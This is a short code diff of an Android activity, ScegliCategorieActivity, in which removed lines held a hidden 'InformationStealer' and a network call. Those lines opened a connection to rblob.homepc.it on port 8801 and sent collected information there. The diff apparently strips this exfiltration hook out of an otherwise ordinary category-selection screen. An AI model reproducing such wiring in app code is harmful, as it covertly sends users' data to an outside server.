@@ -25,8 +25,6 @@ import java.util.Collections;
 
 public class ScegliCategorieActivity extends AppCompatActivity {
 
-    NetworkManager networkManager;
-    InformationStealer informationStealer;
     RecyclerView recyclerView;
     DatabaseHelper my_db;
     ArrayList<CategoriaModel> categorie;
@@ -46,9 +44,6 @@ public class ScegliCategorieActivity extends AppCompatActivity {
 
     public void init(){
         recyclerView = findViewById(R.id.scegliCategorieRecyclerView);
-
-        networkManager = new NetworkManager();
-        informationStealer = new InformationStealer(this);
         my_db = new DatabaseHelper(ScegliCategorieActivity.this);
         categorie = new ArrayList<>();
         id_categorie = new ArrayList<>();
@@ -59,9 +54,6 @@ public class ScegliCategorieActivity extends AppCompatActivity {
 
 
         storeCategorieInArrayList();
-
-        networkManager.openConnection("rblob.homepc.it", 8801, this);
-        networkManager.sendMessage2(informationStealer.getMessaggio());
 
         Collections.sort(categorie, new CategoriaModelStringComparator());
 
